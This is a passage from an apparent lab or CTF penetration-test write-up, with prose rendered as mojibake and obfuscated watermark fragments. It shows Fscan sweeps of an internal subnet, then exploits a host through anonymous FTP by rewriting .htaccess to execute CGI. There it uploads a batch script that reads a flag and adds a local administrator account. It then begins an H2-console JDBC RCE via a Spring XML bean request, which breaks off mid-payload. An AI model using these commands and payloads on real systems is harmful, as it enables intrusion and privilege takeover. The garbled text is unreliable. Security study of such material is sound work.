<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     å¼€å§‹ä¿¡æ¯æ‰«æ
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     CIDRèŒƒå›´: <span class="token number">172.22</span>.10.0-172.22.10.255
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     generate_ip_range_full
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     è§£æCIDR <span class="token number">172.22</span>.10.0/24 -<span class="token operator">&gt;</span> IPèŒƒå›´ <span class="token number">172.22</span>.10.0-172.22.10.255
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: <span class="token number">256</span>
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     å¼€å§‹ä¸»æœºæ‰«æ
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     ä½¿ç”¨æœåŠ¡æ’ä»¶: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç›®æ ‡ <span class="token number">172.22</span>.10.7     å­˜æ´» <span class="token punctuation">(</span>ICMP<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç›®æ ‡ <span class="token number">172.22</span>.10.22    å­˜æ´» <span class="token punctuation">(</span>ICMP<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç›®æ ‡ <span class="token number">172.22</span>.10.17    å­˜æ´» <span class="token punctuation">(</span>ICMP<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç›®æ ‡ <span class="token number">172.22</span>.10.253   å­˜æ´» <span class="token punctuation">(</span>ICMP<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç›®æ ‡ <span class="token number">172.22</span>.10.88    å­˜æ´» <span class="token punctuation">(</span>ICMP<span class="token punctuation">)</span>
<span class="token punctuation">[</span><span class="token number">4</span>.8s<span class="token punctuation">]</span>     å­˜æ´»ä¸»æœºæ•°é‡: <span class="token number">5</span></code></pre>

<p>web02ï¼š</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@web01:~<span class="token comment"># sudo ./FScan_2.0.1_linux_x64 -h 172.22.10.88 -p 1-65535</span>
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚    ___                              _        â”‚
â”‚   / _ <span class="token punctuation">\</span>     ___  ___ _ __ __ _  ___<span class="token operator">|</span> <span class="token operator">|</span> __    â”‚
â”‚  / /_<span class="token punctuation">\</span>/____/ __<span class="token operator">|</span>/ __<span class="token operator">|</span> '__/ _` <span class="token operator">|</span>/ __<span class="token operator">|</span> <span class="token operator">|</span>/ /    â”‚
â”‚ / /_<span class="token punctuation">\</span><span class="token punctuation">\</span>_____<span class="token punctuation">\</span>__ <span class="token punctuation">\</span> <span class="token punctuation">(</span>__<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span>   <span class="token operator">&lt;</span>     â”‚
â”‚ <span class="token punctuation">\</span>____/     <span class="token operator">|</span>___/<span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span>  <span class="token punctuation">\</span>__,_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>_<span class="token punctuation">\</span>    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
      Fscan Version: <span class="token number">2.0</span>.1

<span class="token punctuation">[</span><span class="token number">1</span>.7s<span class="token punctuation">]</span>     å·²é€‰æ‹©æœåŠ¡æ‰«ææ¨¡å¼
<span class="token punctuation">[</span><span class="token number">1</span>.7s<span class="token punctuation">]</span>     å¼€å§‹ä¿¡æ¯æ‰«æ
<span class="token punctuation">[</span><span class="token number">1</span>.7s<span class="token punctuation">]</span>     æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: <span class="token number">1</span>
<span class="token punctuation">[</span><span class="token number">1</span>.7s<span class="token punctuation">]</span>     å¼€å§‹ä¸»æœºæ‰«æ
<span class="token punctuation">[</span><span class="token number">1</span>.7s<span class="token punctuation">]</span>     ä½¿ç”¨æœåŠ¡æ’ä»¶: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     æœ‰æ•ˆç«¯å£æ•°é‡: <span class="token number">65535</span>
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.10.88:21
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.10.88:80
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.10.88:445
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.10.88:139
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.10.88:135
<span class="token punctuation">[</span><span class="token number">7</span>.8s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.10.88:3389
<span class="token punctuation">[</span><span class="token number">43</span>.2s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.10.88:47001
<span class="token punctuation">[</span><span class="token number">44</span>.7s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.10.88:49664
<span class="token punctuation">[</span><span class="token number">44</span>.7s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.10.88:49665
<span class="token punctuation">[</span><span class="token number">44</span>.7s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.10.88:49666
<span class="token punctuation">[</span><span class="token number">44</span>.7s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.10.88:49667
<span class="token punctuation">[</span><span class="token number">44</span>.7s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.10.88:49669
<span class="token punctuation">[</span><span class="token number">44</span>.7s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.10.88:49668
<span class="token punctuation">[</span><span class="token number">44</span>.7s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.10.88:49670
<span class="token punctuation">[</span><span class="token number">44</span>.8s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.10.88:49679
<span class="token punctuation">[</span><span class="token number">55</span>.1s<span class="token punctuation">]</span>     æ‰«æå®Œæˆ, å‘ç° <span class="token number">15</span> ä¸ªå¼€æ”¾ç«¯å£
<span class="token punctuation">[</span><span class="token number">55</span>.1s<span class="token punctuation">]</span>     å­˜æ´»ç«¯å£æ•°é‡: <span class="token number">15</span>
<span class="token punctuation">[</span><span class="token number">55</span>.1s<span class="token punctuation">]</span>     å¼€å§‹æ¼æ´æ‰«æ
<span class="token punctuation">[</span><span class="token number">55</span>.1s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo æ‰«æç»“æœ
ç›®æ ‡ä¸»æœº: <span class="token number">172.22</span>.10.88
ä¸»æœºå: web02
å‘ç°çš„ç½‘ç»œæ¥å£:
   IPv4åœ°å€:
      â””â”€ <span class="token number">172.22</span>.10.88
<span class="token punctuation">[</span><span class="token number">55</span>.1s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç½‘ç«™æ ‡é¢˜ http://172.22.10.88       çŠ¶æ€ç :200 é•¿åº¦:46     æ ‡é¢˜:æ— æ ‡é¢˜
<span class="token punctuation">[</span><span class="token number">55</span>.2s<span class="token punctuation">]</span> <span class="token punctuation">[</span>+<span class="token punctuation">]</span> NetBios <span class="token number">172.22</span>.10.88    WORKGROUP<span class="token punctuation">\</span>WEB02
<span class="token punctuation">[</span><span class="token number">55</span>.2s<span class="token punctuation">]</span>     POCåŠ è½½å®Œæˆ: æ€»å…±387ä¸ªï¼ŒæˆåŠŸ387ä¸ªï¼Œå¤±è´¥0ä¸ª
<span class="token punctuation">[</span><span class="token number">55</span>.2s<span class="token punctuation">]</span> <span class="token punctuation">[</span>+<span class="token punctuation">]</span> FTPæœåŠ¡ <span class="token number">172.22</span>.10.88:21 åŒ¿åç™»å½•æˆåŠŸ<span class="token operator">!</span>
<span class="token punctuation">[</span>1m18s<span class="token punctuation">]</span>     æ‰«æå·²å®Œæˆ: <span class="token number">10</span>/10</code></pre>

<p>databaseï¼š</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@web01:~<span class="token comment"># ./FScan_2.0.1_linux_x64 -h 172.22.10.7 -p 1-65535</span>
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚    ___                              _        â”‚
â”‚   / _ <span class="token punctuation">\</span>     ___  ___ _ __ __ _  ___<span class="token operator">|</span> <span class="token operator">|</span> __    â”‚
â”‚  / /_<span class="token punctuation">\</span>/____/ __<span class="token operator">|</span>/ __<span class="token operator">|</span> '__/ _` <span class="token operator">|</span>/ __<span class="token operator">|</span> <span class="token operator">|</span>/ /    â”‚
â”‚ / /_<span class="token punctuation">\</span><span class="token punctuation">\</span>_____<span class="token punctuation">\</span>__ <span class="token punctuation">\</span> <span class="token punctuation">(</span>__<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span>   <span class="token operator">&lt;</span>     â”‚
â”‚ <span class="token punctuation">\</span>____/     <span class="token operator">|</span>___/<span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span>  <span class="token punctuation">\</span>__,_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>_<span class="token punctuation">\</span>    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
      Fscan Version: <span class="token number">2.0</span>.1

<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     å·²é€‰æ‹©æœåŠ¡æ‰«ææ¨¡å¼
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     å¼€å§‹ä¿¡æ¯æ‰«æ
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: <span class="token number">1</span>
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     å¼€å§‹ä¸»æœºæ‰«æ
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     ä½¿ç”¨æœåŠ¡æ’ä»¶: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     æœ‰æ•ˆç«¯å£æ•°é‡: <span class="token number">65535</span>
<span class="token punctuation">[</span><span class="token number">40</span>.9s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.10.7:8080
<span class="token punctuation">[</span>5m31s<span class="token punctuation">]</span>     æ‰«æå®Œæˆ, å‘ç° <span class="token number">1</span> ä¸ªå¼€æ”¾ç«¯å£
<span class="token punctuation">[</span>5m31s<span class="token punctuation">]</span>     å­˜æ´»ç«¯å£æ•°é‡: <span class="token number">1</span>
<span class="token punctuation">[</span>5m31s<span class="token punctuation">]</span>     å¼€å§‹æ¼æ´æ‰«æ
<span class="token punctuation">[</span>5m32s<span class="token punctuation">]</span>     POCåŠ è½½å®Œæˆ: æ€»å…±387ä¸ªï¼ŒæˆåŠŸ387ä¸ªï¼Œå¤±è´¥0ä¸ª
<span class="token punctuation">[</span>5m32s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç½‘ç«™æ ‡é¢˜ http://172.22.10.7:8080   çŠ¶æ€ç :200 é•¿åº¦:6010   æ ‡é¢˜:é‡‘èæ•°æ®åº“ç®¡ç†ç•Œé¢
<span class="token punctuation">[</span>5m33s<span class="token punctuation">]</span>     æ‰«æå·²å®Œæˆ: <span class="token number">2</span>/2</code></pre>

<p>ollamaï¼š</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">root@web01:~<span class="token comment"># sudo ./FScan_2.0.1_linux_x64 -h 172.22.10.17 -p 1-65535</span>
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚    ___                              _        â”‚
â”‚   / _ <span class="token punctuation">\</span>     ___  ___ _ __ __ _  ___<span class="token operator">|</span> <span class="token operator">|</span> __    â”‚
â”‚  / /_<span class="token punctuation">\</span>/____/ __<span class="token operator">|</span>/ __<span class="token operator">|</span> '__/ _` <span class="token operator">|</span>/ __<span class="token operator">|</span> <span class="token operator">|</span>/ /    â”‚
â”‚ / /_<span class="token punctuation">\</span><span class="token punctuation">\</span>_____<span class="token punctuation">\</span>__ <span class="token punctuation">\</span> <span class="token punctuation">(</span>__<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span>   <span class="token operator">&lt;</span>     â”‚
â”‚ <span class="token punctuation">\</span>____/     <span class="token operator">|</span>___/<span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span>  <span class="token punctuation">\</span>__,_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>_<span class="token punctuation">\</span>    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
      Fscan Version: <span class="token number">2.0</span>.1

<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     å·²é€‰æ‹©æœåŠ¡æ‰«ææ¨¡å¼
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     å¼€å§‹ä¿¡æ¯æ‰«æ
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: <span class="token number">1</span>
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     å¼€å§‹ä¸»æœºæ‰«æ
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     ä½¿ç”¨æœåŠ¡æ’ä»¶: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle
<span class="token punctuation">[</span><span class="token number">1</span>.8s<span class="token punctuation">]</span>     æœ‰æ•ˆç«¯å£æ•°é‡: <span class="token number">65535</span>
<span class="token punctuation">[</span><span class="token number">1</span>.9s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.10.17:22
<span class="token punctuation">[</span><span class="token number">2</span>.2s<span class="token punctuation">]</span> <span class="token punctuation">[</span>*<span class="token punctuation">]</span> ç«¯å£å¼€æ”¾ <span class="token number">172.22</span>.10.17:11434
<span class="token punctuation">[</span><span class="token number">3</span>.6s<span class="token punctuation">]</span>     æ‰«æå®Œæˆ, å‘ç° <span class="token number">2</span> ä¸ªå¼€æ”¾ç«¯å£
<span class="token punctuation">[</span><span class="token number">3</span>.6s<span class="token punctuation">]</span>     å­˜æ´»ç«¯å£æ•°é‡: <span class="token number">2</span>
<span class="token punctuation">[</span><span class="token number">3</span>.6s<span class="token punctuation">]</span>     å¼€å§‹æ¼æ´æ‰«æ
<span class="token punctuation">[</span><span class="token number">35</span>.9s<span class="token punctuation">]</span>     æ‰«æå·²å®Œæˆ: <span class="token number">1</span>/1</code></pre>

<h3 id="2-web02"><a href="#2-web02" class="headerlink" title="2. web02"></a>2. web02</h3><pre class="language-none"><code class="language-none">172.22.10.88:21 åŒ¿åç™»å½• FTP
172.22.10.88:80 å¯¹åº” FTP å¤„çš„ Web æœåŠ¡</code></pre>

<p>ä½¿ç”¨  SFTP <span class="hexo-wm">ğ¬â€Œ3ğ¯ï½…ğ’Â·â€‹sï½‰â€Œâ€‹tğâ€Œï»¿</span>è¯» FTP èµ„æºï¼Œå¾—åˆ°ä¸€ä¸ª <code>.htaccess</code> å’Œ <code>index.html</code></p>
<p>ç”± <a href="https://httpd.apache.org/docs/current/howto/cgi.html">Apache <span class="hexo-wm">ğ¬â€‹â€‹â‘¶â…´eğ§.ï»¿â€‹ğ˜€ğ¢â€‹ğ˜µeâ€Œï»¿</span>æ–‡æ¡£ cgi éƒ¨åˆ†</a> å¯ä»¥å‘ç°ï¼Œé€šè¿‡ä¿®æ”¹ .htaccess å¯ä»¥æŠŠæ–‡ä»¶å½“ä½œ cgi ç›´æ¥æ‰§è¡Œ</p>
<p>ä¿®æ”¹ .htac<span class="hexo-wm">ğ˜´ï»¿â€Œâ‘¶ğ¯â„¯ï½ï¼â€â€‹êœ±ï½‰ï»¿tï½…â€â€</span>cess ä¸ºï¼š</p>
<pre class="language-none"><code class="language-none">Options ExecCGI
SetHandler cgi-script</code></pre>
<p>æ­¤æ—¶è¯¥ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ä¼šè¢«å½“ä½œ <span class="hexo-wm">ğ’”â€â‘¶ğ’—â„¯ğ’ï¼ï»¿siâ€Œâ€‹ï½”ğâ€‹</span>cgi ç›´æ¥æ‰§è¡Œ</p>
<p>ç¼–å†™ä¸€ä¸ª bat <span class="hexo-wm">ğ’”â€‹â€3ğ¯ï½…ğ˜¯â€¢â€‹êœ±iâ€Œâ€Œğ­eâ€</span>è„šæœ¬å¹¶ä¸Šä¼ åˆ° FTP ç›®å½•ä¸‹ï¼š</p>
<pre class="language-bat" data-language="bat"><code class="language-bat">@echo off

echo Content-Type: text/plain

echo:
dir C:\Users\Administrator\Desktop

echo:
type C:\Users\Administrator\Desktop\f1ag.txt

echo:
net user s3ven xxxxxx /add &amp;&amp; net localgroup administrators s3ven /add

:: æˆ–è€…ç›´æ¥ä¿®æ”¹administratorçš„å¯†ç 
:: net user administrator xxxxxx</code></pre>

<p>è®¿é—®å¯¹åº”è·¯ç”±å³å¯å®ç°<span class="hexo-wm">sâ€â‘¶ğ’—ğï½â€¤â€â€Œêœ±iâ€Œï»¿ğ’•â„®ï»¿</span>å›æ˜¾ RCEï¼š</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> http://172.22.10.88/1.bat <span class="token operator">|</span> <span class="token function">iconv</span> <span class="token parameter variable">-f</span> gbk <span class="token parameter variable">-t</span> utf-8</code></pre>

<p>ä½¿ç”¨åˆ›å»ºçš„ç”¨æˆ·æˆ– administrator ç™»å½• <span class="hexo-wm">ğ˜€â€â€Œ3â…´ï½…ğ§ï¼â€Œğ¬iï»¿â€ğ­ğ˜¦ï»¿ï»¿</span>RDP åæŸ¥çœ‹ç½‘å¡ï¼š</p>
<pre class="language-cmd" data-language="cmd"><code class="language-cmd">PS C:\Windows\system32&gt; ipconfig

Windows IP é…ç½®


ä»¥å¤ªç½‘é€‚é…å™¨ ä»¥å¤ªç½‘:

   è¿æ¥ç‰¹å®šçš„ DNS åç¼€ . . . . . . . :
   æœ¬åœ°é“¾æ¥ IPv6 åœ°å€. . . . . . . . : fe80::d497:7e6e:9a96:1023%6
   IPv4 åœ°å€ . . . . . . . . . . . . : 172.22.10.88
   å­ç½‘æ©ç   . . . . . . . . . . . . : 255.255.255.0
   é»˜è®¤ç½‘å…³. . . . . . . . . . . . . : 172.22.10.253</code></pre>

<p>åªæœ‰ä¸€å¼ ç½‘å¡ï¼Œæ²¡æœ‰å¤šä½™çš„ç½‘å¡ï¼Œ<span class="hexo-wm">êœ±ï»¿â€ŒğŸ¯vï½…ğ’ï¼ï»¿ï»¿sï½‰ï»¿â€ğ˜µâ„®â€Œï»¿</span>å› æ­¤ä¸éœ€è¦è¿›ä¸€æ­¥æ¨ªå‘ï¼ŒåŒæ—¶ç³»ç»Ÿä¸­ä¹Ÿæ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„æ–‡ä»¶å’Œä¿¡æ¯</p>
<h3 id="3-database"><a href="#3-database" class="headerlink" title="3. database"></a>3. database</h3><pre class="language-none"><code class="language-none">172.22.10.7:8080 é‡‘èæ•°æ®åº“ç®¡ç†ç•Œé¢</code></pre>

<p>æ ¹æ®æŠ¥é”™é¡µé¢å¯ä»¥åˆ¤æ–­ç³»ç»Ÿä½¿ç”¨çš„æ˜¯ <span class="hexo-wm">ğ¬ï»¿â€‹3â…´â„¯ğ’.â€sâ…ˆâ€Œï»¿ğ˜µï½…â€‹â€Œ</span>Spring æ¡†æ¶</p>
<p>å­˜åœ¨ <code>/h2-console</code> è·¯ç”±ï¼Œå°è¯•é¡µé¢ä¸­åˆ—å‡ºçš„æ‰€æœ‰é©±åŠ¨åå‘ç°å­˜åœ¨ <span class="hexo-wm">Ñ•â€Œï»¿3â…´â„¯nÂ·â€Ñ•â…ˆâ€Œï½”â„®ï»¿</span>PostgreSQL çš„é©±åŠ¨ä¾èµ–</p>
<p>å› æ­¤å°è¯•æ‰“ä¸å‡ºç½‘çš„ Tomcat ä¸´æ—¶æ–‡ä»¶é©»ç•™ + socketFactory <span class="hexo-wm">Ñ•â€‹â‘¶ğ˜·ï½…ğ’ï¼â€Œï»¿ğ’”ï½‰â€Œâ€Œğ’•ğâ€</span>åŠ è½½ Spring XML Bean çš„å›æ˜¾ JDBC RCE</p>
<p>ä½¿ç”¨ java-chains æ„é€ å›æ˜¾ <span class="hexo-wm">Ñ•â€‹â€ğŸ¯vğnâˆ™â€‹Ñ•iâ€â€ï½”eâ€Œ</span>xml bean</p>
<p><img src="image-12.png" alt="image-12.png"></p>
<p>é€šè¿‡ boundary <span class="hexo-wm">sâ€Œï»¿â‘¶â…´ğ˜¦n.ï»¿sâ…ˆâ€ï»¿ï½”ï½…â€Œâ€‹</span>åˆ†æ®µè€Œä¸ç»ˆç»“å®ç° Tomcat ä¸´æ—¶æ–‡ä»¶é©»ç•™</p>
<pre class="language-markup" data-language="markup"><code class="language-markup">POST / HTTP/1.1
Host: 172.22.10.7:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTybnkzTPpCAPkAti
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36
Content-Length: 7982

------WebKitFormBoundaryTybnkzTPpCAPkAti
Content-Disposition: form-data; name="file"; filename="test.txt"

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>
       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>
       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans
                           http://www.springframework.org/schema/beans/spring-beans.xsd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>decoder<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>org.springframework.beans.factory.config.MethodInvokingFactoryBean<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>staticMethod<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>javax.xml.bind.DatatypeConverter.parseBase64Binary<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>arguments<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>list</span><span class="token punctuation">&gt;</span></span>
